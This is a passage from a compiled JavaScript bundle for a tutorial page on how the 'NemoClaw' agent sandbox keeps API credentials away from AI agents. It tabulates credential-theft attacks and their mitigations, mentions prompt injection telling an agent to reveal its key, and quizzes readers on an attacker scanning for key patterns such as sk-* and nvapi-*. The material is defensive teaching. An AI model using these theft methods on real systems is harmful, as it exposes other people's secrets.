        # Step 5: Sanitize the response before returning to sandbox
        #   - Remove any headers that might leak info
        #   - Validate response structure
        return self.sanitize_response(response)`}),e.jsxs(n,{type:"info",title:"Header Stripping Is Critical",children:["The gateway strips all headers from the sandbox request before forwarding. This prevents a subtle attack: an agent (or injected code) could try to add its own ",e.jsx("code",{children:"Authorization"})," header pointing to an attacker's endpoint, hoping the gateway would forward it. By stripping all headers and rebuilding them from the host-side configuration, this attack is neutralized."]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Attack Scenarios and Mitigations"}),e.jsx(i,{title:"Credential Theft Attack Scenarios",headers:["Attack","Why It Fails"],rows:[["Read credential from filesystem","Landlock denies access to /home and ~/.nemoclaw/. The credential files are not mounted in the sandbox."],["Read credential from environment","Sandbox starts with a clean environment. No host env vars are inherited."],["Read credential from process memory (ptrace)","seccomp kills the process on ptrace syscall. The blueprint runs in a separate process outside the sandbox."],["Intercept credential on the network","The credential is added by the blueprint after the request leaves the sandbox. The sandbox side of the connection never sees the credential."],["Use the credential with a different endpoint","Even if a credential were obtained, the network namespace blocks connections to non-whitelisted endpoints."],["Inject Authorization header in request","The gateway strips all headers from sandbox requests and rebuilds them from host-side config."],["DNS exfiltration of discovered credential","DNS is controlled by the OpenShell resolver, which only resolves whitelisted hostnames."]]}),e.jsxs(o,{title:"Credentials in Source Code",children:["Credential isolation protects API keys configured in NemoClaw's credential store. It does ",e.jsx("em",{children:"not"})," protect credentials that are hardcoded in your project's source code or checked into git. If your project files contain API keys, the agent can read them (since ",e.jsx("code",{children:"/sandbox"})," is read-write). Always use ",e.jsx("code",{children:".gitignore"})," and secret scanning to prevent credentials from entering your codebase."]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Security Implications"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:`Credential isolation is what makes it safe to run autonomous agents with access to powerful LLMs. Without it, a prompt injection attack could instruct the agent to "print your API key," and the agent would comply because it has access to the key. With NemoClaw's architecture, even a fully compromised agent cannot access credentials because they are architecturally separated.`}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"This also means that organizations can give agents access to expensive API keys (enterprise tiers with high rate limits) without worrying about key theft. The key is used on behalf of the agent but never exposed to it."}),e.jsx(r,{question:"An attacker achieves remote code execution inside the NemoClaw sandbox. They run a script that searches the entire filesystem for strings matching API key patterns (sk-*, nvapi-*, AIza*). What do they find?",options:["All configured API keys, because they must be accessible for inference to work","Encrypted versions of the API keys","Nothing -- the keys do not exist anywhere in the sandbox filesystem, environment, or memory","The keys, but only if the agent has recently made an inference request"],correctIndex:2,explanation:"The attacker finds nothing. API keys exist only in the blueprint process's memory and in the encrypted credential store, both of which are outside the sandbox. The sandbox's filesystem (restricted by Landlock), environment (clean), and memory space (separate process) contain no trace of any API key. The inference request from the sandbox goes to inference.local without any credentials; the blueprint attaches credentials in its own process after receiving the request via IPC."}),e.jsx(s,{references:[{title:"NemoClaw Credential Security Model",url:"https://docs.nvidia.com/nemoclaw/security/credentials",type:"docs",description:"In-depth documentation on credential isolation architecture."},{title:"OWASP Credential Management",url:"https://cheatsheetseries.owasp.org/cheatsheets/Credential_Management_Cheat_Sheet.html",type:"article",description:"General best practices for credential management that informed NemoClaw's design."}]})]})}const Q=Object.freeze(Object.defineProperty({__proto__:null,default:T},Symbol.toStringTag,{value:"Module"}));export{_ as a,R as b,E as c,D as d,q as e,B as f,F as g,G as h,V as i,U as j,W as k,H as l,z as m,$ as n,K as o,Y as p,J as q,X as r,M as s,Q as t};
